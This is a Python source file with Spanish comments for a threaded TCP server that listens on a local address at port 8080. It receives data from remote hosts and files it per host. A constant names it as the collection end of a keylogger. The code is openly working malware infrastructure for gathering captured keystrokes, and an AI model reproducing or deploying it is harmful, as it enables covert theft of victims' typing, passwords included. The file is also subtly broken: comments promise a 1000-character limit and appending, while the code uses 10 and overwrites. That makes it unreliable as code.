import socket
import threading
from pathlib import Path


KEYLOGGER_FILE_LENGTH = 10
TCP_PORT = 8080
ruta = Path(__file__).parent / 'files'
if not ruta.exists():
    ruta.mkdir()


def file_manager(host, msg):
    # Buscar archivos en la carpeta files que tengan el mismo nombre que el host
    # patron: host_{id}.txt
    archivos = list(ruta.glob(f'{host}_*.txt'))
    if not archivos:
        # Si no hay archivos, crear uno nuevo
        archivo: Path = ruta / f'{host}_1.txt'
        archivo.write_text(msg)
    else:
        # Si hay archivos, buscar el último
        archivo = archivos[-1]
        contenido = archivo.read_text()
        # Si el texto del archivo es menor a 1000 caracteres, agregar el mensaje
        # recibido al final del archivo
        if len(contenido) < KEYLOGGER_FILE_LENGTH:
            archivo.write_text(msg)
        else:
            # Si el texto del archivo es mayor a 1000 caracteres, crear un nuevo
            # archivo con el siguiente id
            file_id = int(archivo.stem.split('_')[-1]) + 1
            archivo = ruta / f'{host}_{file_id}.txt'
            archivo.write_text(msg)



def handle_client(conexion, direccion):
    host, _ = direccion
    while True:
        datos = conexion.recv(1024)
        if not datos:
            break

        # Procesar los datos recibidos
        mensaje = datos.decode('utf-8')
        file_manager(host, mensaje)
        print('Se ha recibido el siguiente mensaje:', mensaje)

    # Cerrar la conexión entrante
    conexion.close()


def main():
    servidor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor_socket.bind(('192.168.1.52', TCP_PORT))
    print(f'Escuchando conexiones entrantes en el puerto: {TCP_PORT}')
    servidor_socket.listen()

    while True:
        conexion, direccion = servidor_socket.accept()
        print('Se ha establecido una conexión desde', direccion)
        hilo = threading.Thread(target=handle_client,
                                args=(conexion, direccion))
        hilo.start()


if __name__ == '__main__':
    main()
